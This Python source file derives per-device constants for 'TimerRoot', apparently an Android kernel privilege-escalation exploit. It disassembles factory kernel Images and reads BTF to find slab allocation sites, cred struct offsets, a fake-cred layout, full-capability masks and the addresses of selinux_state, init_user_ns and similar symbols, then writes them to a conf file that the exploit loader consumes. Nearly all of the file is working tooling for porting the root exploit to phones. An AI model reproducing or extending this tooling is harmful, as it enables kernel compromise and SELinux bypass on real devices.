#!/usr/bin/env python3
"""
Derive TimerRoot conf constants from a factory kernel Image + vendor_boot.img.

Every value this writes is re-derivable by hand with the procedure in SKILL.md
(F3-F5).  The point of the script is to do the mechanical part - disassembly,
BTF, ELF data reads - and to refuse to write a conf when a critical constant
could not be established.

Usage:
  python3 derive_conf.py \
    --image Image \
    --vendor-boot vendor_boot.img \
    --device "OPPO Reno 16F" \
    --output conf/<banner>.conf

--release defaults to the banner found in the Image itself, which is the only
value `uname -r` will ever match; do not pass it unless the Image is stripped
of its banner (the script warns when the two disagree).
"""

import argparse
import os
import re
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

# conf keys the loader in p7a/timer_p7a.c refuses to run without and that have
# no default in conf_defaults().  A generated file missing any of these is
# dead on arrival, so the script checks for them before it exits 0.
REQUIRED_BY_LOADER = (
    'timer_site',
    'copy_process_low21',
    'task_alloc_bytes',
    'task_cred_off',
    'cred_req',
    'cred_alloc',
    'cred_uid_off',
    'selinux_state',
    'root_user',
    'init_user_ns',
    'init_ucounts',
    'init_groups',
    'ksu_kmi',
)


class DeriveError(Exception):
    pass


def run(cmd, check=True):
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        msg = f"{cmd[0]}: {result.stderr.strip()[:400]}"
        if check:
            raise DeriveError(msg)
        print(f"[warn] {msg}", file=sys.stderr)
    return result.stdout


# ---------------------------------------------------------------------------
# ELF access
# ---------------------------------------------------------------------------

def elf_sections(path):
    """[(name, vaddr, file_offset, size, type)] from readelf -SW."""
    out = run(['readelf', '-SW', path])
    sections = []
    for line in out.splitlines():
        m = re.match(r'\s*\[\s*\d+\]\s+(\S+)\s+(\S+)\s+([0-9a-f]+)\s+'
                     r'([0-9a-f]+)\s+([0-9a-f]+)', line)
        if m:
            sections.append((m.group(1), int(m.group(3), 16),
                             int(m.group(4), 16), int(m.group(5), 16),
                             m.group(2)))
    return sections


def read_va(path, sections, va, size):
    """
    Read `size` bytes at virtual address `va`.

    This replaces `llvm-objdump -s --start-address`, which dumps from the start
    of the enclosing section on a vmlinux-to-elf reconstruction (it has a single
    .kernel section and no section headers to range against), so every address
    lookup silently returned the ELF header instead of the symbol.
    """
    for name, vaddr, offset, length, stype in sections:
        if vaddr <= va < vaddr + length:
            if stype == 'NOBITS':
                return b'\0' * size
            with open(path, 'rb') as f:
                f.seek(offset + (va - vaddr))
                return f.read(size)
    raise DeriveError(f"0x{va:x} is not inside any section of {path}")


def read_u32(path, sections, va):
    return int.from_bytes(read_va(path, sections, va, 4), 'little')


def read_cstr(path, sections, va, limit=256):
    raw = read_va(path, sections, va, limit)
    return raw.split(b'\0')[0].decode('latin1')


# ---------------------------------------------------------------------------
# Symbols
# ---------------------------------------------------------------------------

def get_symbols(path):
    """name -> address, from a single nm invocation."""
    out = run(['nm', '--defined-only', '-n', path])
    symbols = {}
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3:
            try:
                symbols[parts[-1]] = int(parts[0], 16)
            except ValueError:
                continue
    return symbols


def get_symbol_sizes(path):
    """name -> size, from a single nm -S invocation (not one call per name)."""
    out = run(['nm', '-S', '--defined-only', path])
    sizes = {}
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 4:
            try:
                sizes[parts[-1]] = int(parts[1], 16)
            except ValueError:
                continue
    return sizes


# ---------------------------------------------------------------------------
# Disassembly
# ---------------------------------------------------------------------------

INSNS_RE = re.compile(r'^\s*([0-9a-f]+):\s+(\S+)\s*(.*)$')
IMM_RE = re.compile(r'#(-?0x[0-9a-f]+|-?\d+)')


def parse_insns(asm_text):
    """
    [(addr, mnemonic, operands)] from llvm-objdump -d.

    The anchor is the address at the start of a *stripped* line, because
    objdump emits `ffffffc0803634fc:\tbl\t...` with no leading whitespace.
    """
    insns = []
    for line in asm_text.splitlines():
        m = INSNS_RE.match(line)
        if m:
            insns.append((int(m.group(1), 16), m.group(2), m.group(3).strip()))
    return insns


def disassemble_at(path, addr, length):
    out = run(['llvm-objdump', '-d', '--no-show-raw-insn',
               f'--start-address=0x{addr:016x}',
               f'--stop-address=0x{addr + length:016x}', path], check=False)
    return parse_insns(out)


def adrp_target(ops):
    """The page address from `adrp xN, 0x...` (objdump resolves it)."""
    m = re.search(r'0x([0-9a-f]{6,})', ops)
    return int(m.group(1), 16) if m else None


def immediate(ops):
    m = IMM_RE.search(ops)
    return int(m.group(1), 0) if m else None


def resolve_cachep_before(insns, bl_index, cachep_addr):
    """
    True when x0 at the bl was built from cachep_addr.

    Replays the window forward so an adrp that feeds a later ldr is resolved
    before it is used.  The original script accepted the first
    kmem_cache_alloc bl in the function regardless of its argument, so a
    function that allocates two different caches would return the wrong
    return address.
    """
    reg = {}
    for i in range(max(0, bl_index - 24), bl_index):
        _, mnem, ops = insns[i]
        if mnem == 'adrp':
            m = re.match(r'(x\d+),', ops)
            if m:
                reg[m.group(1)] = adrp_target(ops)
        elif mnem == 'add':
            m = re.match(r'(x\d+),\s*(x\d+),\s*#(0x[0-9a-f]+|\d+)', ops)
            if m:
                base = reg.get(m.group(2))
                if base is not None:
                    reg[m.group(1)] = base + int(m.group(3), 0)
        elif mnem == 'ldr':
            m = re.match(r'(x\d+),\s*\[(x\d+)(?:,\s*#(0x[0-9a-f]+|\d+))?\]',
                         ops)
            if m:
                base = reg.get(m.group(2))
                if base is not None:
                    reg[m.group(1)] = base + (int(m.group(3), 0)
                                              if m.group(3) else 0)
        elif re.match(r'[xw]0,', ops) and mnem not in ('cmp', 'cbz', 'cbnz',
                                                       'str', 'strb', 'strh'):
            # x0 was reassigned by something we do not model: the argument
            # at the bl is not the cachep we are looking for.
            reg['x0'] = None
    return reg.get('x0') == cachep_addr


def is_alloc_tag_path(insns, bl_index):
    """
    The alloc-tag profiling twin swaps current->alloc_tag around the call,
    visible as `mrs x*, SP_EL0` just before it (and a read of it shortly
    after).  The window is asymmetric on purpose: the later `mrs` in
    do_timer_create at +0x1c is unrelated epilogue state, so a symmetric
    window misclassifies the real call site on 6.12+.
    """
    window = insns[max(0, bl_index - 15): bl_index + 5]
    return any(m == 'mrs' and 'SP_EL0' in o for _, m, o in window)


def find_cache_alloc_site(path, func_addr, func_size, cachep_addr, label,
                          verbose=True):
    """
    Return address (bl + 4) of the non-profiling kmem_cache_alloc that
    allocates `cachep_addr` inside the function at func_addr.
    """
    if not func_addr or not cachep_addr:
        return None
    scan = min(max(func_size, 0x100) + 0x80, 0x4000)
    insns = disassemble_at(path, func_addr, scan)
    for i, (addr, mnem, ops) in enumerate(insns):
        if mnem != 'bl' or 'kmem_cache_alloc' not in ops:
            continue
        if is_alloc_tag_path(insns, i):
            continue
        if not resolve_cachep_before(insns, i, cachep_addr):
            if verbose:
                print(f"[!] {label}: bl at 0x{addr:x} does not load "
                      f"0x{cachep_addr:x} into x0; skipping", file=sys.stderr)
            continue
        return addr + 4
    return None


def find_timer_site(path, symbols, sizes):
    cachep = symbols.get('posix_timers_cache')
    if not cachep:
        raise DeriveError("posix_timers_cache not in kallsyms")
    for func in ('alloc_posix_timer', 'do_timer_create'):
        site = find_cache_alloc_site(path, symbols.get(func),
                                     sizes.get(func, 0x400), cachep, 'timer')
        if site:
            print(f"[+] timer_site from {func}: 0x{site:016x}")
            return site
    raise DeriveError("timer_site: no kmem_cache_alloc(posix_timers_cache) "
                      "found in alloc_posix_timer/do_timer_create")


def find_copy_process_low21(path, symbols, sizes):
    cachep = symbols.get('task_struct_cachep')
    if not cachep:
        raise DeriveError("task_struct_cachep not in kallsyms")
    for func in ('dup_task_struct', 'copy_process'):
        site = find_cache_alloc_site(path, symbols.get(func),
                                     sizes.get(func, 0x2000), cachep, 'task')
        if site:
            low21 = site & 0x1FFFFF
            print(f"[+] copy_process_low21 from {func}: 0x{low21:x}")
            return low21
    raise DeriveError("copy_process_low21: no kmem_cache_alloc"
                      "(task_struct_cachep) found in dup_task_struct/"
                      "copy_process")


# ---------------------------------------------------------------------------
# BTF
# ---------------------------------------------------------------------------

def btf_from_image(image_path, workdir):
    """
    Carve the .BTF section out of a raw ARM64 Image.

    A vmlinux produced by vmlinux-to-elf has only .kernel/.bss/.symtab, so
    `bpftool btf dump file vmlinux.elf` fails and the original script silently
    fell back to hardcoded 6.1-shaped struct offsets on every kernel.
    """
    data = Path(image_path).read_bytes()
    magic = b'\x9f\xeb\x01\x00\x18\x00\x00\x00'
    pos = data.find(magic)
    if pos < 0:
        raise DeriveError("no BTF magic in the Image (kernel built without "
                          "CONFIG_DEBUG_INFO_BTF)")
    (_, _, _, hdr_len, type_off, type_len, str_off, str_len) = \
        struct.unpack_from('<HBBIIIII', data, pos)
    total = hdr_len + max(type_off + type_len, str_off + str_len)
    out = Path(workdir) / 'btf.bin'
    out.write_bytes(data[pos:pos + total])
    print(f"[+] carved .BTF from Image: {total} bytes")
    return str(out)


def find_btf(vmlinux_path, image_path, workdir):
    out = run(['readelf', '-SW', vmlinux_path])
    if '.BTF' in out:
        return vmlinux_path
    return btf_from_image(image_path, workdir)


def parse_btf_structs(btf_path):
    """
    name -> {'__size__': n, field: byte_offset}.  Keeps the largest definition
    when a name is emitted twice (vmlinux BTF and the split BTF variant).
    """
    raw = run(['bpftool', 'btf', 'dump', 'file', btf_path, 'format', 'raw'])
    structs = {}
    current = None
    size = 0
    fields = {}

    def flush():
        if not current:
            return
        prev = structs.get(current)
        if prev is None or prev.get('__size__', 0) <= size:
            structs[current] = {'__size__': size, **fields}

    for line in raw.splitlines():
        m = re.match(r"\[\d+\] (STRUCT|UNION) '([^']+)' size=(\d+)", line)
        if m:
            flush()
            current, size, fields = m.group(2), int(m.group(3)), {}
            continue
        m = re.match(r"\s+'([^']+)' type_id=\d+ bits_offset=(\d+)", line)
        if m and current:
            fields[m.group(1)] = int(m.group(2)) // 8
            continue
        if re.match(r'\[\d+\] ', line):
            flush()
            current = None

    flush()
    return structs


# ---------------------------------------------------------------------------
# LSM registration order -> selinux_blob_off
# ---------------------------------------------------------------------------

def find_config_lsm(path, sections):
    """
    The built-in CONFIG_LSM= default string, from .rodata.

    Scanned over the whole file in chunks, not section-by-section with an
    8 MB cap: on a vmlinux-to-elf reconstruction everything lands in one
    .kernel section and the string can sit tens of megabytes in, which made
    the original fall back to "no LSM order" and miscompute the blob offset.
    """
    needle = b'landlock,lockdown'
    size = 1 << 20
    overlap = len(needle) - 1
    with open(path, 'rb') as f:
        base = 0
        tail = b''
        while True:
            chunk = f.read(size)
            if not chunk:
                break
            buf = tail + chunk
            idx = buf.find(needle)
            if idx >= 0:
                candidate = buf[idx:idx + 256].split(b'\0')[0]
                text = candidate.decode('latin1')
                if re.fullmatch(r'[a-z_]+(,[a-z_]+)+', text):
                    file_off = base - len(tail) + idx
                    for _, vaddr, offset, length, stype in sections:
                        if (stype != 'NOBITS' and
                                offset <= file_off < offset + length):
                            return vaddr + (file_off - offset), text
                    return None, text
            base += len(chunk)
            tail = buf[-overlap:]
    return None, None


def find_alloc_req_off(btf):
    """
    bytes_req minus call_site in the kmem trace event, which is what the
    exploit reads at site + ALLOC_REQ_OFF.  6.18 added a `name` field ahead of
    bytes_req and moved it to 0x18; every earlier family is 0x10.

    Deriving it beats hardcoding: `--selfcheck` only accepts 0x10 or 0x18, and
    a 6.18 kernel written as 0x10 makes every task-alloc scan miss.
    """
    for name in ('trace_event_raw_kmem_cache_alloc',
                 'trace_event_raw_kmem_alloc',
                 'trace_event_raw_kmalloc'):
        ev = btf.get(name)
        if not ev:
            continue
        call_site = ev.get('call_site')
        bytes_req = ev.get('bytes_req')
        if call_site is not None and bytes_req is not None:
            off = bytes_req - call_site
            if off in (0x10, 0x18):
                print(f"[+] alloc_req_off = 0x{off:x} (from {name})")
                return off
            raise DeriveError(f"{name}: bytes_req-call_site = 0x{off:x}, "
                              f"expected 0x10 or 0x18")
    print("[!] no kmem trace event in BTF; alloc_req_off defaults to 0x10",
          file=sys.stderr)
    return 0x10


def find_selinux_blob_off(path, sections, symbols, btf):
    """
    Replay lsm_set_blob_size() over the cred blob.

    Only LSMs that are in __start_lsm_info..__end_lsm_info contribute: the
    CONFIG_LSM string lists every *supported* LSM, and ones compiled out are
    absent from the registry no matter what the string says.  Landlock is not
    special-cased; it is just one contributor among however many the build
    actually has, which is what makes OPPO/6.6 (0x0) and 6.18 (0x10) differ.
    """
    start = symbols.get('__start_lsm_info')
    end = symbols.get('__end_lsm_info')
    if not start or not end or end <= start:
        raise DeriveError("__start_lsm_info/__end_lsm_info not in kallsyms")

    blob_sym = {}
    for name, addr in symbols.items():
        if name.endswith('_blob_sizes'):
            blob_sym[addr] = name[:-len('_blob_sizes')]

    lbs = btf.get('lsm_blob_sizes', {})
    cred_off = lbs.get('lbs_cred')
    if cred_off is None:
        raise DeriveError("BTF has no lsm_blob_sizes.lbs_cred")

    entries = []
    for addr in range(start, end, 48):
        name_ptr = int.from_bytes(read_va(path, sections, addr, 8), 'little')
        order = int.from_bytes(read_va(path, sections, addr + 8, 4), 'little',
                               signed=True)
        sizes_ptr = int.from_bytes(read_va(path, sections, addr + 40, 8),
                                   'little')
        if not name_ptr:
            break
        entries.append((read_cstr(path, sections, name_ptr), order, sizes_ptr))

    _, config_lsm = find_config_lsm(path, sections)
    tokens = [t for t in (config_lsm or '').split(',') if t]

    effective = [e for e in entries if e[1] == -1]
    for token in tokens:
        effective += [e for e in entries if e[0] == token and e[1] == 0]
    effective += [e for e in entries if e[1] == 1]

    total = 0
    offsets = {}
    sizes = {}
    for name, _, sizes_ptr in effective:
        if not sizes_ptr or sizes_ptr not in blob_sym:
            continue
        size = read_u32(path, sections, sizes_ptr + cred_off)
        if size < 1:
            continue
        aligned = (total + 7) & ~7
        offsets[name] = aligned
        sizes[name] = size
        total = aligned + size

    print(f"[+] LSM registry: {[e[0] for e in entries]}")
    print(f"[+] CONFIG_LSM  : {config_lsm}")
    print(f"[+] cred blobs  : {sizes}")
    if 'selinux' not in offsets:
        raise DeriveError("SELinux registers no cred blob; is "
                          "CONFIG_SECURITY_SELINUX off?")
    off = offsets['selinux']
    print(f"[+] selinux_blob_off = 0x{off:x} (cred blob total 0x{total:x})")
    return off


# ---------------------------------------------------------------------------
# vendor_boot
# ---------------------------------------------------------------------------

def get_vendor_ext(vendor_boot_img):
    """
    android_arch_task_struct_size from the vendor command line.

    unpack_bootimg writes it to `bootconfig`/`vendor_cmdline` and echoes the
    mkbootimg command on stdout.  The original script only grepped the *files*
    in the output directory for the key as text, which misses the bootconfig
    encoding, so it always returned 0 and task_alloc_bytes lost the vendor
    extension (0x1440 instead of 0x1750 on Pixel 11).
    """
    if not vendor_boot_img or not os.path.exists(vendor_boot_img):
        return 0

    with tempfile.TemporaryDirectory() as tmpdir:
        out = run(['unpack_bootimg', '--boot_img', vendor_boot_img,
                   '--out', tmpdir, '--format', 'mkbootimg'], check=False)
        haystacks = [out]
        for fname in os.listdir(tmpdir):
            fpath = os.path.join(tmpdir, fname)
            if os.path.isfile(fpath):
                try:
                    with open(fpath, 'r', errors='ignore') as f:
                        haystacks.append(f.read())
                except OSError:
                    pass
        for text in haystacks:
            m = re.search(r'android_arch_task_struct_size=(\d+)', text)
            if m:
                val = int(m.group(1))
                print(f"[+] android_arch_task_struct_size={val}")
                return val
    print("[!] android_arch_task_struct_size not set (no vendor extension)")
    return 0


# ---------------------------------------------------------------------------
# Release / page size
# ---------------------------------------------------------------------------

def get_banner(image_path):
    """The `Linux version <banner>` released by the Image, i.e. `uname -r`."""
    out = run(['strings', '-a', image_path], check=False)
    for line in out.splitlines():
        m = re.search(r'Linux version (\S+)', line)
        if m:
            return m.group(1)
    raise DeriveError("no 'Linux version' banner in the Image")


def get_page_size(image_path):
    """Page size from `file`, which reports it for a raw ARM64 Image."""
    out = run(['file', '-b', image_path], check=False)
    m = re.search(r'page size (\d+)', out)
    if m:
        return int(m.group(1))
    if '16K pages' in out:
        return 16384
    if '64K pages' in out:
        return 65536
    return 4096


def ksu_kmi_for(release):
    """android<API>-<kernel major.minor>, the string ksud reads."""
    android = re.search(r'-android(\d+)-', release)
    kmi = re.match(r'(\d+\.\d+)', release)
    if not android or not kmi:
        raise DeriveError(f"cannot infer KMI from release '{release}'")
    return f"android{android.group(1)}-{kmi.group(1)}"


def va_window(page_size):
    """
    The direct-map window the exploit's calibrate_base() vote must land in.

    VA_BITS and the linear-map base depend on the page size (48-bit VA on 4K,
    47-bit on 16K/64K), so a 16K profile written with the 4K window fails the
    `linear_min < linear_max <= timer_site` selfcheck.
    """
    if page_size >= 16384:
        return 0xffff000000000000, 0xffffc00000000000
    return 0xffffff0000000000, 0xffffffc000000000


def pcp_free_for_release(release):
    """
    5.10, 5.15 and 6.1 free the order-1 slab through the PCP lists, so no
    mm_page_free event is emitted and the reclaim has to gate on slabinfo.
    repo.  On 6.6+ let the QEMU run decide (docs/porting.md).  The Samsung
    s23fe profile (5.10.240) is the evidence for 5.10 needing it too.
    """
    return 1 if re.match(r'^(5\.10|5\.15|6\.1\.)', release) else 0


# ---------------------------------------------------------------------------
# Derivation
# ---------------------------------------------------------------------------

def derive(args):
    vmlinux = args.vmlinux
    print(f"\n=== Deriving conf for {args.device or 'unknown device'} ===\n")

    banner = get_banner(vmlinux)
    release = args.release or banner
    if args.release and args.release != banner:
        print(f"[!] --release '{args.release}' differs from the Image banner "
              f"'{banner}'; the app matches on uname -r, so the banner wins",
              file=sys.stderr)
        release = banner
    page_size = args.page_size or get_page_size(
        args.image or vmlinux)
    print(f"[+] release={release}  page_size={page_size}")

    sections = elf_sections(vmlinux)
    symbols = get_symbols(vmlinux)
    sizes = get_symbol_sizes(vmlinux)
    print(f"[+] {len(symbols)} symbols, {len(sections)} sections")

    btf_path = find_btf(vmlinux, args.image or vmlinux, args.workdir)
    btf = parse_btf_structs(btf_path)
    print(f"[+] {len(btf)} BTF structs")

    for need in ('cred', 'task_struct', 'k_itimer', 'lsm_blob_sizes'):
        if need not in btf:
            raise DeriveError(f"BTF has no struct '{need}'")

    cred = btf['cred']
    task_s = btf['task_struct']
    kit = btf['k_itimer']

    timer_site = find_timer_site(vmlinux, symbols, sizes)
    cp_low21 = find_copy_process_low21(vmlinux, symbols, sizes)

    # --- cred -------------------------------------------------------------
    cred_size = cred['__size__']
    cred_alloc = (cred_size + 63) & ~63
    usage_width = 8 if cred.get('uid', 0) >= 8 else 4
    cred_uid_off = cred.get('uid', 4)
    cred_euid_off = cred.get('euid')
    if cred_euid_off is None:
        raise DeriveError("BTF cred has no 'euid' field")
    cred_cap_off = cred.get('cap_inheritable')
    cred_security_off = cred.get('security')
    cred_user_off = cred.get('user')
    cred_userns_off = cred.get('user_ns')
    cred_ucounts_off = cred.get('ucounts')
    cred_group_off = cred.get('group_info')
    for name, val in (('cap_inheritable', cred_cap_off),
                      ('security', cred_security_off),
                      ('user', cred_user_off),
                      ('user_ns', cred_userns_off),
                      ('ucounts', cred_ucounts_off),
                      ('group_info', cred_group_off)):
        if val is None:
            raise DeriveError(f"BTF cred has no '{name}' field")

    if cred_uid_off != usage_width:
        raise DeriveError(f"cred.uid at 0x{cred_uid_off:x} but usage is "
                          f"{usage_width} bytes; profile would break the "
                          f"selfcheck invariant")

    cap_fields = [f for f in ('cap_inheritable', 'cap_permitted',
                              'cap_effective', 'cap_bset', 'cap_ambient')
                  if f in cred]
    cred_cap_count = len(cap_fields)

    timer_alloc = kit['__size__']
    timer_node_off = kit.get('it')
    if timer_node_off is None:
        raise DeriveError("BTF k_itimer has no 'it' union")

    # --- task -------------------------------------------------------------
    task_cred_off = task_s.get('cred')
    if task_cred_off is None:
        raise DeriveError("BTF task_struct has no 'cred' field")
    task_struct_size = task_s['__size__']
    vendor_ext = get_vendor_ext(args.vendor_boot)
    # The exploit's task-alloc scanner accepts TASK_ALLOC_BYTES and
    # TASK_ALLOC_BYTES + 0x310, so the exact request is what belongs here.
    # Do NOT round up: 0x1440 + 0x310 is 0x1750, and rounding to 64 would
    # make 0x1780, which no trace record ever carries.
    task_alloc_bytes = task_struct_size + vendor_ext

    # --- symbols ----------------------------------------------------------
    def sym(name):
        val = symbols.get(name)
        if not val:
            raise DeriveError(f"symbol not in kallsyms: {name}")
        return val

    selinux_state = sym('selinux_state')
    panic_on_warn = sym('panic_on_warn')
    root_user = sym('root_user')
    init_user_ns = sym('init_user_ns')
    init_ucounts = sym('init_ucounts')
    init_groups = sym('init_groups')

    selinux_blob_off = find_selinux_blob_off(vmlinux, sections, symbols, btf)

    alloc_req_off = find_alloc_req_off(btf)

    # --- slab -------------------------------------------------------------
    # SLUB picks the slab order from the *possible CPU count* on the device,
    # so it is a hardware fact the Image cannot answer.  The static guess
    # (16K pages -> order 0, 4K -> order 1) is right for every bundled
    # profile except Pixel 11, whose live cache is order 0 on 4K pages.
    slab_order = args.slab_order
    if slab_order is None:
        slab_order = 0 if page_size >= 16384 else 1
        print(f"[!] slab_order={slab_order} is a static guess; confirm it "
              f"against `adb shell grep posix_timers_cache /proc/slabinfo` "
              f"(pagesperslab) and pass --slab-order", file=sys.stderr)
    slab_size = page_size << slab_order
    linear_min, linear_max = va_window(page_size)

    conf = {
        'release': release,
        'ksu_kmi': ksu_kmi_for(release),
        'page_size': page_size,
        'page_shift': page_size.bit_length() - 1,
        'slab_order': slab_order,
        'slab_size': slab_size,
        'linear_min': linear_min,
        'linear_max': linear_max,
        'pcp_free': pcp_free_for_release(release),
        'timer_site': timer_site,
        'copy_process_low21': cp_low21,
        'timer_alloc': timer_alloc,
        'timer_node_off': timer_node_off,
        'task_alloc_bytes': task_alloc_bytes,
        'alloc_req_off': alloc_req_off,
        'task_cred_off': task_cred_off,
        'cred_req': cred_size,
        'cred_alloc': cred_alloc,
        'cred_size': cred_size,
        'cred_uid_off': cred_uid_off,
        'cred_euid_off': cred_euid_off,
        'cred_cap_off': cred_cap_off,
        'cred_cap_count': cred_cap_count,
        # loader-side names: these three are fake-cred relative offsets
        'cred_security_off': cred_security_off,
        'cred_user_off': cred_user_off,
        'cred_userns_off': cred_userns_off,
        'cred_ucounts_off': cred_ucounts_off,
        'cred_group_off': cred_group_off,
        'fake_cred_off': 0x18,
        'fake_caps_off': 0x18 + cred_cap_off,
        'selinux_state': selinux_state,
        'panic_on_warn': panic_on_warn,
        'root_user': root_user,
        'init_user_ns': init_user_ns,
        'init_ucounts': init_ucounts,
        'init_groups': init_groups,
        'selinux_blob_off': selinux_blob_off,
        'selinux_sid_kernel': 1,
        'fullcap': 0x1ffffffffff,
    }
    return conf


# ---------------------------------------------------------------------------
# Validation and output
# ---------------------------------------------------------------------------

def validate(conf):
    """The F6 invariants from --selfcheck, which the loader will also assert."""
    ss = conf['slab_size']
    problems = []
    if ss != conf['page_size'] << conf['slab_order']:
        problems.append("slab_size != page_size << slab_order")
    if not conf['copy_process_low21'] < 0x200000:
        problems.append("copy_process_low21 does not fit in 21 bits")
    # timer_site_low21 is derived from timer_site in load_conf(), so the only
    # thing worth asserting is that the site is a real image address at all.
    if not conf['timer_site']:
        problems.append("timer_site is 0 (no allocation site was found)")
    if conf['cred_uid_off'] not in (4, 8):
        problems.append("cred_uid_off is neither 4 nor 8")
    if conf['fake_cred_off'] != 0x18:
        problems.append("fake_cred_off != 0x18")
    if conf['fake_caps_off'] < 0x28:
        problems.append("fake_caps_off < 0x28 collides with securebits")
    if not conf['cred_req'] < conf['cred_alloc']:
        problems.append("cred_req >= cred_alloc")
    if conf['fake_cred_off'] + conf['cred_size'] > ss - conf['timer_node_off']:
        problems.append("fake cred cannot fit in the slab")
    if not conf['timer_site'] >= conf['linear_max']:
        problems.append("timer_site below linear_max (image must be above "
                        "the direct map)")
    return problems


def write_conf(conf, output_path, device_name):
    def h(v):
        return f'0x{v:016x}'

    lines = []
    if device_name:
        lines.append(f'# Device: {device_name}')
    lines.append('# Generated by scripts/derive_conf.py - re-verify F1 and F6')
    lines.append('# before use (see docs/porting.md).')
    lines.append('')
    lines.append(f'release = "{conf["release"]}"')
    lines.append('schema_version = 1')
    lines.append(f'ksu_kmi = "{conf["ksu_kmi"]}"')
    lines.append('')
    lines.append(f'page_size = {conf["page_size"]}')
    lines.append(f'page_shift = {conf["page_shift"]}')
    lines.append(f'slab_order = {conf["slab_order"]}')
    lines.append(f'slab_size = {conf["slab_size"]}')
    lines.append(f'linear_min = 0x{conf["linear_min"]:016x}')
    lines.append(f'linear_max = 0x{conf["linear_max"]:016x}')
    lines.append('')
    if conf['pcp_free']:
        lines.append('pcp_free = 1')
        lines.append('')
    lines += [
        f'timer_site = {h(conf["timer_site"])}',
        f'timer_alloc = 0x{conf["timer_alloc"]:x}',
        f'timer_node_off = 0x{conf["timer_node_off"]:x}',
        '',
        f'cred_req = 0x{conf["cred_req"]:x}',
        f'cred_alloc = 0x{conf["cred_alloc"]:x}',
        f'cred_size = 0x{conf["cred_size"]:x}',
        f'cred_uid_off = 0x{conf["cred_uid_off"]:x}',
        f'cred_euid_off = 0x{conf["cred_euid_off"]:x}',
        f'cred_cap_off = 0x{conf["cred_cap_off"]:x}',
        f'cred_cap_count = {conf["cred_cap_count"]}',
        f'cred_security_off = 0x{conf["cred_security_off"]:x}',
        f'cred_user_off = 0x{conf["cred_user_off"]:x}',
        f'cred_userns_off = 0x{conf["cred_userns_off"]:x}',
        f'cred_ucounts_off = 0x{conf["cred_ucounts_off"]:x}',
        f'cred_group_off = 0x{conf["cred_group_off"]:x}',
        f'fake_cred_off = 0x{conf["fake_cred_off"]:x}',
        '',
        f'task_cred_off = 0x{conf["task_cred_off"]:x}',
        f'copy_process_low21 = 0x{conf["copy_process_low21"]:x}',
        f'task_alloc_bytes = 0x{conf["task_alloc_bytes"]:x}',
        '',
        f'alloc_req_off = 0x{conf["alloc_req_off"]:x}',
        '',
        f'fullcap = 0x{conf["fullcap"]:x}',
        f'root_user = {h(conf["root_user"])}',
        f'init_user_ns = {h(conf["init_user_ns"])}',
        f'init_ucounts = {h(conf["init_ucounts"])}',
        f'init_groups = {h(conf["init_groups"])}',
        '',
        f'selinux_state = {h(conf["selinux_state"])}',
        f'panic_on_warn = {h(conf["panic_on_warn"])}',
        f'selinux_blob_off = 0x{conf["selinux_blob_off"]:x}',
        f'selinux_sid_kernel = {conf["selinux_sid_kernel"]}',
    ]
    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    Path(output_path).write_text('\n'.join(lines) + '\n')
    print(f"\n[+] wrote {output_path}")


def conf_name(conf):
    """
    conf/<banner>.conf, with -16k/-64k only when uname -r does not already
    say so.  The `release` value inside stays the literal banner: that is what
    the app compares against, and a 16K kernel reports the bare string.
    """
    banner = conf['release']
    suffix = f"-{conf['page_size'] // 1024}k"
    if banner.endswith(suffix):
        return f"{banner}.conf"
    if conf['page_size'] == 4096:
        return f"{banner}.conf"
    return f"{banner}{suffix}.conf"


def main():
    ap = argparse.ArgumentParser(
        description='Derive a TimerRoot conf from a factory kernel Image')
    ap.add_argument('--vmlinux', required=True,
                    help='vmlinux ELF (vmlinux-to-elf output) with symbols')
    ap.add_argument('--image', default=None,
                    help='raw kernel Image, for the .BTF section and the '
                         'banner (defaults to --vmlinux)')
    ap.add_argument('--vendor-boot', default=None,
                    help='vendor_boot.img, for android_arch_task_struct_size')
    ap.add_argument('--release', default=None,
                    help='override the banner (default: read from the Image)')
    ap.add_argument('--page-size', default=None, type=int,
                    help='override the page size (default: read from the '
                         'Image)')
    ap.add_argument('--slab-order', default=None, type=int,
                    help='SLUB order for posix_timers_cache (default: 0 on '
                         '16K+ pages, else 1).  This is a hardware fact from '
                         '/proc/slabinfo, not derivable from the Image.')
    ap.add_argument('--device', default='', help='human-readable device name')
    ap.add_argument('--output', default=None,
                    help='output .conf path (default: conf/<banner>.conf)')
    ap.add_argument('--workdir', default=None,
                    help='scratch directory for the carved .BTF')
    args = ap.parse_args()

    if args.workdir is None:
        args.workdir = os.path.dirname(os.path.abspath(args.output or
                                                      args.vmlinux))
    Path(args.workdir).mkdir(parents=True, exist_ok=True)

    try:
        conf = derive(args)
    except DeriveError as exc:
        print(f"\n[error] {exc}", file=sys.stderr)
        print("[error] refusing to write a conf from incomplete constants",
              file=sys.stderr)
        return 1

    problems = validate(conf)
    if problems:
        print("\n[error] F6 selfcheck would fail:", file=sys.stderr)
        for problem in problems:
            print(f"  - {problem}", file=sys.stderr)
        return 1

    output = args.output or f"conf/{conf_name(conf)}"
    write_conf(conf, output, args.device)

    with open(output) as f:
        written = {m.group(1) for m in re.finditer(r'^([a-z_0-9]+)\s*=',
                                                   f.read(), re.M)}
    missing = [key for key in REQUIRED_BY_LOADER if key not in written]
    if missing:
        print(f"[error] conf is missing loader-required keys: {missing}",
              file=sys.stderr)
        return 1

    print(f"\nDone. This file is a candidate, not a port. Before it ships:")
    print("  F1  disassemble begin_new_exec() and confirm "
          "posix_cpu_timers_exit() still runs before exit_itimers()")
    print(f"  F6  timer --conf {output} selfcheck   (needs 0 failures)")
    print(f"  F6  timer --conf {output} target")
    print("  F7+ prove it in QEMU against the factory Image, then on the "
          "device")
    return 0


if __name__ == '__main__':
    sys.exit(main())
